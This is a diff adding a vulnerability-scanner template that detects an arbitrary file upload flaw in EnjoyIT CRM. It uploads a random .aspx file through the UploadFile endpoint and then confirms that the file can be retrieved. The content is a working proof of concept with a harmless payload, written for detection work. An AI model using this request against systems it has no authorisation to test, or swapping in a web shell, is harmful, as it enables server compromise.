@@ -1,0 +1,49 @@
+id: poc-enjoyit-crm-uploadfile-anyfile-upload
+info:
+  name: Anyfile Upload Vulnerability in EnjoyIT CRM
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Detects arbitrary file upload vulnerability in EnjoyIT CRM's UploadFile endpoint.
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/file/UploadFile?fileinfo={'UploadUserNo':'0000','LastChunk':true,'FileName':'{{t1}}.aspx','IsUseMongdb':true,'UploadTime':'2025-06-18T12:11:56'}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{t2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"ObjectData\":"
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/TempFileNew/0000_202506181211560000_{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
